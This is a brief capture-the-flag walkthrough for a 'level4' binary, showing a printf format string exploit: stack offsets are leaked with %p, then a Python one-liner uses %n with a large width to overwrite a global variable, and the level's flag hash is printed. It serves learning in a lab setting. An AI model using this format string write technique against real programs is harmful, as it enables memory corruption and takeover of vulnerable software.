# level 4

There is a call to printf, when calling p() in n().
It compares the variable m to 16930116 (0x1025544), we can use the %n exploit like in level3.

Let's find in which position does our argv[1] variable address starts.

    $ ./level4 
    aaaabbbbcccc %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
    aaaabbbbcccc 0xb7ff26b0 0xbffff684 0xb7fd0ff4 (nil) (nil) 0xbffff648 0x804848d 0xbffff440 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x62626262 0x63636363 0x20702520

The variable argv[1] is in the 12th position. 
We can't write 16930116 characters, so we use the width parameter of printf.

input:
4 - bytes address of m
16930112 - bytes padding

    (python -c 'print ("\x10\x98\x04\x08" + "%16930112c" + "%12$n")') | ./level4
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a